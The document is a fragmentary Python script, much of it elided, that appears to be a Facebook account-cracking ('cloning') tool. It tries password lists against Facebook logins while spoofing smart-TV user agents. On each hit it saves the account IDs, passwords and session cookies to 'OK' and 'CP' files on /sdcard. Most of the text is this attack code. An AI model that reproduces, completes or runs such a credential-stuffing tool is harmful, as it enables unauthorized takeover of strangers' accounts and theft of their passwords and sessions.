...
def randBuildLSB():
    ...
    ua = f'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Odin/88.4324.2.10 Safari/537.36 HbbTV/1.6.1 (+DRM;Hisense;2022_32A35EEVS_Hisense;V0004.06.12S.N0417;32A35EEVS;SmartTV_2022_1_FHD;) FVC/7.0 (Hisense;SmartTV_2022_1_FHD;) LaTivu_1.0.1_2022)'+ END
    return ua
#<------[main-ua]---->
def riazfile():
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m[Ahmed.xd-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/Ahmed.xd-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[Ahmed.xd-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/Ahmed.xd-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def method3(self, rid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;91m[Ahmed.xd-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/Ahmed.xd-OK.txt','a').write(rid+'|'+ps+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
def riazcp():
    ...
    print(' Ids saved in Ahmed.xd-OK.txt,in cp Ahmed.xd-CP.txt')
    linex()
    input(' Press Enter to Back')    
    os.system('python Ahmed.py')
#<------[Cloning]------>
        ...
        for ps in pwx:
           ...
           'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Ahmed.xd-OK] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/Ahmed.xd-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Ahmed.xd-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[Ahmed.xd-OK] '+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/Ahmed.xd-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                print('\r\r\033[1;32m[Ahmed.xd-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Ahmed.xd-OK.txt', 'a').write(ids+'|'+pas+'\n')                                
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RIAZ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[Ahmed.xd-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[Ahmed.xd-OK] '+uid+' | '+ps+'\033[1;32m')
				open('Ahmed.xd-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[Ahmed.xd-CP] '+uid+' | '+ps+'\33[0;97m')
				open('Ahmed.xd-CP.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
